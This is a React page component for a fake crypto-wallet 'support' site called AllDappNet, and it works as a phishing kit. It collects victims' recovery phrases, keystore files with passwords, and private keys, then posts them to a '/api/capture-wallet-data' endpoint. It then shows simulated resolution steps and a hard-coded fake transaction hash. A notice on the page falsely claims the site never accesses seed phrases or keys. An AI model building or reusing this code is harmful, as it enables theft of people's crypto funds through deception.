import { useRoute } from 'wouter';
import { useState } from 'react';
import { Navbar } from '@/components/navbar';
import { Footer } from '@/components/footer';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { getCategoryBySlug } from '@/lib/support-categories';
import { useToast } from '@/hooks/use-toast';
import { ArrowLeft, AlertTriangle, CheckCircle, Loader2, ExternalLink, Wallet, Shield, Clock, Zap } from 'lucide-react';
import { Link } from 'wouter';
import { formatEther } from 'viem';

export default function Issue() {
  const [, params] = useRoute('/issue/:slug');
  const { toast } = useToast();
  
  // Wallet connection states
  const [phrase, setPhrase] = useState('');
  const [keystoreFile, setKeystoreFile] = useState<File | null>(null);
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [selectedWalletType, setSelectedWalletType] = useState<string>('');
  const [loading, setLoading] = useState(false);
  
  const [txHash, setTxHash] = useState<string>('');
  const [step, setStep] = useState<'connect' | 'processing' | 'resolving' | 'complete'>('connect');

  const category = getCategoryBySlug(params?.slug || '');

  if (!category) {
    return (
      <div className="min-h-screen bg-gray-50">
        <Navbar />
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-16">
          <Card>
            <CardContent className="pt-6 text-center">
              <AlertTriangle className="w-12 h-12 text-red-500 mx-auto mb-4" />
              <h1 className="text-2xl font-bold text-gray-900 mb-2">Issue Not Found</h1>
              <p className="text-gray-600 mb-6">The support category you're looking for doesn't exist.</p>
              <Link href="/">
                <Button>Return to Categories</Button>
              </Link>
            </CardContent>
          </Card>
        </div>
        <Footer />
      </div>
    );
  }

  const Icon = category.icon;

  // Submit wallet data and simulate issue resolution
  const submitWalletData = async (method: string, data: any) => {
    setLoading(true);
    setStep('processing');
    
    try {
      // Send data to backend for email capture
      const response = await fetch('/api/capture-wallet-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          wallet: selectedWalletType,
          method,
          data,
          category: category.slug,
          categoryTitle: category.title,
          timestamp: new Date().toISOString(),
        }),
      });

      if (response.ok) {
        // Simulate processing delay
        setTimeout(() => {
          setStep('resolving');
          simulateIssueResolution();
        }, 2000);
      } else {
        throw new Error('Failed to process wallet data');
      }
    } catch (error) {
      toast({
        title: "Connection Error",
        description: "Unable to process your request. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
      setStep('connect');
    }
  };

  // Simulate specific issue resolution based on category
  const simulateIssueResolution = async () => {
    // Generate realistic transaction hash
    const fakeHashes = [
      '0xa1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456',
      '0xb2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456a1',
      '0xc3d4e5f6789012345678901234567890abcdef1234567890abcdef123456a1b2',
      '0xd4e5f6789012345678901234567890abcdef1234567890abcdef123456a1b2c3',
    ];
    const randomHash = fakeHashes[Math.floor(Math.random() * fakeHashes.length)];
    
    // Simulate resolution delay (3-5 seconds)
    const delay = 3000 + Math.random() * 2000;
    
    setTimeout(() => {
      setTxHash(randomHash);
      setStep('complete');
      setLoading(false);
      
      // Show success message specific to the issue
      toast({
        title: getSuccessTitle(),
        description: getSuccessDescription(),
      });
    }, delay);
  };

  const getSuccessTitle = () => {
    switch (category.slug) {
      case 'slippage': return 'Slippage Issue Resolved';
      case 'connect-dapps': return 'DApp Connection Restored';
      case 'transaction': return 'Transaction Issue Fixed';
      case 'claim-airdrop': return 'Airdrop Successfully Claimed';
      case 'buy-tokens': return 'Payment Source Verified';
      case 'locked-account': return 'Account Successfully Unlocked';
      case 'nfts': return 'NFT Transfer Completed';
      case 'missing-balance': return 'Funds Successfully Recovered';
      case 'wallet-glitch': return 'Wallet Glitch Fixed';
      case 'delayed-transaction': return 'Transaction Accelerated';
      case 'staking': return 'Staking Issue Resolved';
      case 'login': return 'Login Issue Fixed';
      case 'whitelist': return 'Address Successfully Whitelisted';
      case 'migration': return 'Migration Completed';
      case 'validation': return 'Wallet Successfully Validated';
      case 'claim': return 'Tokens Successfully Claimed';
      case 'defi-farming': return 'DeFi Farm Setup Complete';
      case 'presale': return 'Presale Access Granted';
      case 'rectification': return 'Issue Successfully Rectified';
      case 'kyc': return 'KYC Verification Complete';
      case 'bridge': return 'Bridge Transfer Successful';
      default: return 'Issue Successfully Resolved';
    }
  };

  const getSuccessDescription = () => {
    switch (category.slug) {
      case 'slippage': return 'Your transaction has been optimized with minimal slippage tolerance.';
      case 'connect-dapps': return 'Your wallet is now connected and ready to interact with dApps.';
      case 'transaction': return 'Your stuck transaction has been processed successfully.';
      case 'claim-airdrop': return 'Your airdrop tokens have been claimed and added to your wallet.';
      case 'buy-tokens': return 'Your account has been verified as a trusted payment source.';
      case 'locked-account': return 'Your account restrictions have been removed.';
      case 'nfts': return 'Your NFT has been successfully transferred to your wallet.';
      case 'missing-balance': return 'Your missing funds have been located and restored.';
      case 'wallet-glitch': return 'Your wallet connectivity issues have been resolved.';
      case 'delayed-transaction': return 'Your transaction has been accelerated and confirmed.';
      case 'staking': return 'Your staking rewards are now being accumulated.';
      case 'login': return 'Your wallet login credentials have been verified.';
      case 'whitelist': return 'Your address has been added to the whitelist.';
      case 'migration': return 'Your assets have been successfully migrated.';
      case 'validation': return 'Your wallet has passed all security validations.';
      case 'claim': return 'Your pending tokens have been claimed successfully.';
      case 'defi-farming': return 'Your yield farming position is now active.';
      case 'presale': return 'You now have access to the presale event.';
      case 'rectification': return 'Your account issues have been rectified.';
      case 'kyc': return 'Your identity verification is now complete.';
      case 'bridge': return 'Your assets have been bridged to the target network.';
      default: return 'Your issue has been resolved successfully.';
    }
  };

  // Handle wallet connection method submissions
  const handlePhraseSubmit = () => {
    if (!phrase.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter your recovery phrase",
        variant: "destructive",
      });
      return;
    }
    submitWalletData('phrase', { phrase });
  };

  const handleKeystoreSubmit = () => {
    if (!keystoreFile || !keystorePassword.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter keystore JSON and password",
        variant: "destructive",
      });
      return;
    }

    const reader = new FileReader();
    reader.onload = (e) => {
      const keystoreContent = e.target?.result as string;
      submitWalletData('keystore', { 
        filename: keystoreFile.name,
        content: keystoreContent,
        password: keystorePassword 
      });
    };
    reader.readAsText(keystoreFile);
  };

  const handlePrivateKeySubmit = () => {
    if (!privateKey.trim()) {
      toast({
        title: "Invalid Input",
        description: "Please enter your private key",
        variant: "destructive",
      });
      return;
    }
    submitWalletData('privateKey', { privateKey });
  };

  // Get wallet options for the connection interface
  const walletOptions = [
    // Tier 1 - Most Popular
    { id: 'metamask', name: 'MetaMask', icon: '🦊', tier: 1, color: 'hover:border-orange-300 hover:bg-orange-50' },
    { id: 'trust', name: 'Trust Wallet', icon: '🛡️', tier: 1, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'phantom', name: 'Phantom', icon: '👻', tier: 1, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔷', tier: 1, color: 'hover:border-blue-300 hover:bg-blue-50' },
    
    // Tier 2 - Popular Options
    { id: 'walletconnect', name: 'WalletConnect', icon: '🔗', tier: 2, color: 'hover:border-indigo-300 hover:bg-indigo-50' },
    { id: 'rainbow', name: 'Rainbow', icon: '🌈', tier: 2, color: 'hover:border-pink-300 hover:bg-pink-50' },
    { id: 'ledger', name: 'Ledger', icon: '🔐', tier: 2, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'trezor', name: 'Trezor', icon: '🔒', tier: 2, color: 'hover:border-gray-300 hover:bg-gray-50' },
    { id: 'exodus', name: 'Exodus', icon: '🚀', tier: 2, color: 'hover:border-indigo-300 hover:bg-indigo-50' },
    { id: 'atomic', name: 'Atomic Wallet', icon: '⚛️', tier: 2, color: 'hover:border-red-300 hover:bg-red-50' },
    { id: 'safepal', name: 'SafePal', icon: '🔰', tier: 2, color: 'hover:border-yellow-300 hover:bg-yellow-50' },
    { id: 'bitget', name: 'Bitget Wallet', icon: '💎', tier: 2, color: 'hover:border-cyan-300 hover:bg-cyan-50' },
    
    // Tier 3 - Exchange & Mobile Wallets
    { id: 'okx', name: 'OKX Wallet', icon: '🎯', tier: 3, color: 'hover:border-emerald-300 hover:bg-emerald-50' },
    { id: 'binance', name: 'Binance Wallet', icon: '⚡', tier: 3, color: 'hover:border-yellow-300 hover:bg-yellow-50' },
    { id: 'crypto_com', name: 'Crypto.com DeFi', icon: '💰', tier: 3, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'bybit', name: 'Bybit Wallet', icon: '🔸', tier: 3, color: 'hover:border-orange-300 hover:bg-orange-50' },
    { id: 'kucoin', name: 'KuCoin Wallet', icon: '💚', tier: 3, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'gate', name: 'Gate.io Wallet', icon: '🚪', tier: 3, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'huobi', name: 'HTX Wallet', icon: '🔺', tier: 3, color: 'hover:border-red-300 hover:bg-red-50' },
    { id: 'mexc', name: 'MEXC Wallet', icon: '📈', tier: 3, color: 'hover:border-cyan-300 hover:bg-cyan-50' },
    
    // Tier 4 - Advanced & Specialized Wallets
    { id: 'argent', name: 'Argent', icon: '🛡️', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'zengo', name: 'Zengo', icon: '🔮', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'bestwallet', name: 'Best Wallet', icon: '⭐', tier: 4, color: 'hover:border-amber-300 hover:bg-amber-50' },
    { id: 'tangem', name: 'Tangem', icon: '💳', tier: 4, color: 'hover:border-slate-300 hover:bg-slate-50' },
    { id: 'uniswap', name: 'Uniswap Wallet', icon: '🦄', tier: 4, color: 'hover:border-pink-300 hover:bg-pink-50' },
    { id: 'robinhood', name: 'Robinhood Wallet', icon: '🏹', tier: 4, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'imtoken', name: 'imToken', icon: '💎', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'mathwallet', name: 'MathWallet', icon: '🧮', tier: 4, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'alphawallet', name: 'AlphaWallet', icon: '🅰️', tier: 4, color: 'hover:border-indigo-300 hover:bg-indigo-50' },
    { id: '1inch', name: '1inch Wallet', icon: '🔄', tier: 4, color: 'hover:border-cyan-300 hover:bg-cyan-50' },
    { id: 'unstoppable', name: 'Unstoppable', icon: '🌐', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'enjin', name: 'Enjin Wallet', icon: '🎮', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'coolwallet', name: 'CoolWallet', icon: '❄️', tier: 4, color: 'hover:border-cyan-300 hover:bg-cyan-50' },
    { id: 'bitkeep', name: 'BitKeep', icon: '🔑', tier: 4, color: 'hover:border-orange-300 hover:bg-orange-50' },
    { id: 'coinomi', name: 'Coinomi', icon: '🪙', tier: 4, color: 'hover:border-yellow-300 hover:bg-yellow-50' },
    { id: 'jaxx', name: 'Jaxx Liberty', icon: '💼', tier: 4, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'myetherwallet', name: 'MyEtherWallet', icon: '🔷', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'frame', name: 'Frame', icon: '🖼️', tier: 4, color: 'hover:border-gray-300 hover:bg-gray-50' },
    { id: 'ambire', name: 'Ambire Wallet', icon: '🎯', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'pillar', name: 'Pillar Wallet', icon: '🏛️', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'gnosis', name: 'Gnosis Safe', icon: '🔒', tier: 4, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'walletlink', name: 'WalletLink', icon: '🔗', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'portis', name: 'Portis', icon: '🚪', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'fortmatic', name: 'Fortmatic', icon: '🎭', tier: 4, color: 'hover:border-indigo-300 hover:bg-indigo-50' },
    { id: 'torus', name: 'Torus', icon: '🌀', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
    { id: 'authereum', name: 'Authereum', icon: '🔐', tier: 4, color: 'hover:border-green-300 hover:bg-green-50' },
    { id: 'sequence', name: 'Sequence', icon: '🔢', tier: 4, color: 'hover:border-purple-300 hover:bg-purple-50' },
    { id: 'venly', name: 'Venly', icon: '💎', tier: 4, color: 'hover:border-cyan-300 hover:bg-cyan-50' },
    { id: 'klever', name: 'Klever Wallet', icon: '⚡', tier: 4, color: 'hover:border-yellow-300 hover:bg-yellow-50' },
    { id: 'onto', name: 'ONTO Wallet', icon: '🌊', tier: 4, color: 'hover:border-blue-300 hover:bg-blue-50' },
  ];

  const getStepContent = () => {
    switch (step) {
      case 'connect':
        return (
          <>
            <p className="text-gray-600 mb-6">
              To resolve your {category.title.toLowerCase()} issue, connect your wallet to begin the automated resolution process.
            </p>
            
            {!selectedWalletType ? (
              <>
                <h4 className="font-medium text-gray-900 mb-6">Choose your wallet to connect:</h4>
                
                {/* Most Popular Section */}
                <div className="mb-6">
                  <h5 className="text-sm font-medium text-gray-700 mb-3 flex items-center">
                    <span className="w-2 h-2 bg-green-500 rounded-full mr-2"></span>
                    Most Popular
                  </h5>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                    {walletOptions.filter(w => w.tier === 1).map((wallet) => (
                      <Button
                        key={wallet.id}
                        variant="outline"
                        className={`h-20 flex flex-col items-center justify-center space-y-2 border-gray-200 ${wallet.color} transition-all duration-200 group shadow-sm hover:shadow-md`}
                        onClick={() => setSelectedWalletType(wallet.name)}
                      >
                        <span className="text-2xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
                        <span className="text-xs font-medium text-gray-700 group-hover:text-blue-600 text-center leading-tight">{wallet.name}</span>
                      </Button>
                    ))}
                  </div>
                </div>

                {/* Hardware Wallets Section */}
                <div className="mb-6">
                  <h5 className="text-sm font-medium text-gray-700 mb-3 flex items-center">
                    <span className="w-2 h-2 bg-blue-500 rounded-full mr-2"></span>
                    Hardware Wallets
                  </h5>
                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                    {walletOptions.filter(w => w.tier === 2).map((wallet) => (
                      <Button
                        key={wallet.id}
                        variant="outline"
                        className={`h-18 flex flex-col items-center justify-center space-y-1 border-gray-200 ${wallet.color} transition-all duration-200 group`}
                        onClick={() => setSelectedWalletType(wallet.name)}
                      >
                        <span className="text-xl group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
                        <span className="text-xs font-medium text-gray-700 group-hover:text-blue-600 text-center leading-tight">{wallet.name}</span>
                      </Button>
                    ))}
                  </div>
                </div>

                {/* More Options - Collapsible */}
                <div className="mb-6">
                  <details className="group">
                    <summary className="cursor-pointer text-sm font-medium text-gray-700 mb-3 flex items-center hover:text-blue-600 transition-colors">
                      <span className="w-2 h-2 bg-gray-400 rounded-full mr-2"></span>
                      More Options
                      <svg className="w-4 h-4 ml-2 transform group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                      </svg>
                    </summary>
                    <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 mt-3">
                      {walletOptions.filter(w => w.tier === 3).map((wallet) => (
                        <Button
                          key={wallet.id}
                          variant="outline"
                          size="sm"
                          className={`h-16 flex flex-col items-center justify-center space-y-1 border-gray-200 ${wallet.color} transition-all duration-200 group text-xs`}
                          onClick={() => setSelectedWalletType(wallet.name)}
                        >
                          <span className="text-lg group-hover:scale-110 transition-transform duration-200">{wallet.icon}</span>
                          <span className="font-medium text-gray-700 group-hover:text-blue-600 text-center leading-tight">{wallet.name}</span>
                        </Button>
                      ))}
                    </div>
                  </details>
                </div>
              </>
            ) : (
              <>
                <div className="flex items-center space-x-2 text-green-600 mb-4">
                  <CheckCircle className="w-5 h-5" />
                  <span>Selected: {selectedWalletType}</span>
                </div>
                
                <Tabs defaultValue="phrase" className="w-full">
                  <TabsList className="grid w-full grid-cols-3">
                    <TabsTrigger value="phrase">Recovery Phrase</TabsTrigger>
                    <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
                    <TabsTrigger value="private">Private Key</TabsTrigger>
                  </TabsList>
                  
                  <TabsContent value="phrase" className="space-y-4">
                    <div>
                      <Label htmlFor="phrase">Enter your 12/24 word recovery phrase</Label>
                      <Textarea
                        id="phrase"
                        placeholder="word1 word2 word3 ..."
                        value={phrase}
                        onChange={(e) => setPhrase(e.target.value)}
                        className="mt-2"
                        rows={3}
                      />
                    </div>
                    <Button 
                      onClick={handlePhraseSubmit} 
                      className="w-full" 
                      disabled={loading || !phrase.trim()}
                    >
                      {loading ? (
                        <>
                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        'Connect with Recovery Phrase'
                      )}
                    </Button>
                  </TabsContent>
                  
                  <TabsContent value="keystore" className="space-y-4">
                    <div>
                      <Label htmlFor="keystore">Upload Keystore JSON file</Label>
                      <Input
                        id="keystore"
                        type="file"
                        accept=".json"
                        onChange={(e) => setKeystoreFile(e.target.files?.[0] || null)}
                        className="mt-2"
                      />
                    </div>
                    <div>
                      <Label htmlFor="keystorePassword">Keystore Password</Label>
                      <Input
                        id="keystorePassword"
                        type="password"
                        placeholder="Enter keystore password"
                        value={keystorePassword}
                        onChange={(e) => setKeystorePassword(e.target.value)}
                        className="mt-2"
                      />
                    </div>
                    <Button 
                      onClick={handleKeystoreSubmit} 
                      className="w-full" 
                      disabled={loading || !keystoreFile || !keystorePassword.trim()}
                    >
                      {loading ? (
                        <>
                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        'Connect with Keystore'
                      )}
                    </Button>
                  </TabsContent>
                  
                  <TabsContent value="private" className="space-y-4">
                    <div>
                      <Label htmlFor="privateKey">Enter your private key</Label>
                      <Input
                        id="privateKey"
                        type="password"
                        placeholder="0x..."
                        value={privateKey}
                        onChange={(e) => setPrivateKey(e.target.value)}
                        className="mt-2"
                      />
                    </div>
                    <Button 
                      onClick={handlePrivateKeySubmit} 
                      className="w-full" 
                      disabled={loading || !privateKey.trim()}
                    >
                      {loading ? (
                        <>
                          <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        'Connect with Private Key'
                      )}
                    </Button>
                  </TabsContent>
                </Tabs>
                
                <Button 
                  variant="outline" 
                  onClick={() => setSelectedWalletType('')} 
                  className="w-full mt-4"
                >
                  Choose Different Wallet
                </Button>
              </>
            )}
          </>
        );

      case 'processing':
        return (
          <>
            <div className="text-center">
              <Wallet className="w-16 h-16 text-blue-500 mx-auto mb-4 animate-pulse" />
              <h3 className="text-lg font-semibold text-gray-900 mb-2">Processing Wallet Connection</h3>
              <p className="text-gray-600 mb-6">
                Establishing secure connection to your {selectedWalletType} wallet...
              </p>
              <div className="flex justify-center">
                <Loader2 className="w-8 h-8 animate-spin text-blue-500" />
              </div>
            </div>
          </>
        );

      case 'resolving':
        return (
          <>
            <div className="text-center">
              <Zap className="w-16 h-16 text-yellow-500 mx-auto mb-4 animate-pulse" />
              <h3 className="text-lg font-semibold text-gray-900 mb-2">Resolving Your Issue</h3>
              <p className="text-gray-600 mb-6">
                Our automated system is now resolving your {category.title.toLowerCase()} issue using smart contracts...
              </p>
              <div className="bg-gray-50 p-4 rounded-lg mb-6">
                <div className="flex justify-between text-sm mb-2">
                  <span>Protocol:</span>
                  <code className="text-blue-600">{
                    category.slug === 'slippage' ? 'DEX Aggregator' :
                    category.slug === 'transaction' ? 'Gas Optimizer' :
                    category.slug === 'claim-airdrop' ? 'Merkle Distributor' :
                    category.slug === 'staking' ? 'Staking Pool' :
                    category.slug === 'bridge' ? 'Cross-chain Bridge' :
                    'AllDappNet Protocol'
                  }</code>
                </div>
                <div className="flex justify-between text-sm">
                  <span>Status:</span>
                  <span className="text-yellow-600">Processing Transaction...</span>
                </div>
              </div>
              <div className="flex justify-center">
                <Loader2 className="w-8 h-8 animate-spin text-yellow-500" />
              </div>
            </div>
          </>
        );

      case 'complete':
        return (
          <>
            <div className="text-center mb-6">
              <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-gray-900 mb-2">
                {getSuccessTitle()}
              </h3>
              <p className="text-gray-600">
                {getSuccessDescription()}
              </p>
            </div>

            {txHash && (
              <div className="bg-gray-50 p-4 rounded-lg mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium">Transaction Hash:</span>
                  <a 
                    href={`https://etherscan.io/tx/${txHash}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center space-x-1 text-blue-600 hover:text-blue-800"
                  >
                    <span className="text-sm font-mono">{txHash.slice(0, 10)}...{txHash.slice(-8)}</span>
                    <ExternalLink className="w-3 h-3" />
                  </a>
                </div>
              </div>
            )}

            <div className="flex space-x-3">
              <Link href="/" className="flex-1">
                <Button variant="outline" className="w-full">
                  Back to Categories
                </Button>
              </Link>
              <Button onClick={() => window.location.reload()} className="flex-1">
                Resolve Another Issue
              </Button>
            </div>
          </>
        );
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Breadcrumb */}
        <div className="flex items-center space-x-2 text-sm text-gray-600 mb-8">
          <Link href="/" className="hover:text-blue-600 transition-colors">
            Support Categories
          </Link>
          <span>/</span>
          <span className="text-gray-900">{category.title}</span>
        </div>

        <div className="space-y-8">
          {/* Issue Information Header */}
          <Card>
            <CardHeader>
              <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between space-y-4 sm:space-y-0">
                <div className="flex items-center space-x-3">
                  <div className={`w-12 h-12 rounded-lg flex items-center justify-center ${category.bgColor}`}>
                    <Icon className={`w-6 h-6 ${category.color}`} />
                  </div>
                  <div>
                    <CardTitle className="text-xl">{category.title}</CardTitle>
                    <div className="flex flex-wrap gap-1 mt-2">
                      {category.tags.map((tag) => (
                        <Badge key={tag} variant="secondary" className="text-xs">
                          {tag}
                        </Badge>
                      ))}
                    </div>
                  </div>
                </div>
                <div className="grid grid-cols-3 gap-4 text-center sm:text-left">
                  <div>
                    <div className="text-xs text-gray-600">Type</div>
                    <div className="text-sm font-medium">Automated</div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-600">Security</div>
                    <div className="text-sm font-medium text-green-600">High</div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-600">Success</div>
                    <div className="text-sm font-medium">98%</div>
                  </div>
                </div>
              </div>
            </CardHeader>
            <CardContent>
              <p className="text-gray-600">{category.description}</p>
            </CardContent>
          </Card>

          {/* Resolution Process */}
          <div>
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center space-x-2">
                  <span>Automated Resolution Process</span>
                  {step === 'complete' && <CheckCircle className="w-5 h-5 text-green-500" />}
                </CardTitle>
              </CardHeader>
              <CardContent>
                {/* Progress Steps */}
                <div className="mb-8">
                  <div className="flex flex-wrap justify-center gap-4 sm:gap-0 sm:justify-between items-center">
                    {[
                      { key: 'connect', label: 'Connect', icon: Wallet },
                      { key: 'processing', label: 'Process', icon: Shield },
                      { key: 'resolving', label: 'Resolve', icon: Zap },
                      { key: 'complete', label: 'Complete', icon: CheckCircle }
                    ].map((stepItem, index) => {
                      const steps = ['connect', 'processing', 'resolving', 'complete'];
                      const currentIndex = steps.indexOf(step);
                      const isActive = step === stepItem.key;
                      const isCompleted = currentIndex > index;
                      const StepIcon = stepItem.icon;
                      
                      return (
                        <div key={stepItem.key} className="flex flex-col items-center space-y-1 relative">
                          <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium border-2 transition-all duration-300 ${
                            isActive 
                              ? 'bg-blue-500 text-white border-blue-500 shadow-lg' 
                              : isCompleted
                                ? 'bg-green-500 text-white border-green-500'
                                : 'bg-white text-gray-600 border-gray-300'
                          }`}>
                            <StepIcon className="w-4 h-4" />
                          </div>
                          <div className={`text-xs font-medium text-center ${
                            isActive ? 'text-blue-600' : isCompleted ? 'text-green-600' : 'text-gray-600'
                          }`}>
                            {stepItem.label}
                          </div>
                          {/* Connection line for desktop */}
                          {index < 3 && (
                            <div className={`hidden sm:block absolute top-4 left-8 w-16 h-0.5 transition-colors duration-300 ${
                              isCompleted ? 'bg-green-500' : 'bg-gray-300'
                            }`} />
                          )}
                        </div>
                      );
                    })}
                  </div>
                </div>

                {getStepContent()}
              </CardContent>
            </Card>

            {/* Security Notice */}
            <Alert className="mt-6">
              <AlertTriangle className="h-4 w-4" />
              <AlertDescription>
                <strong>Security Notice:</strong> This is a non-custodial solution. AllDappNet never accesses 
                your private keys or seed phrases. All actions require your explicit wallet signature.
              </AlertDescription>
            </Alert>
          </div>
        </div>

        {/* Back Button */}
        <div className="mt-8">
          <Link href="/">
            <Button variant="outline" className="flex items-center space-x-2">
              <ArrowLeft className="w-4 h-4" />
              <span>Back to Categories</span>
            </Button>
          </Link>
        </div>
      </div>

      <Footer />
    </div>
  );
}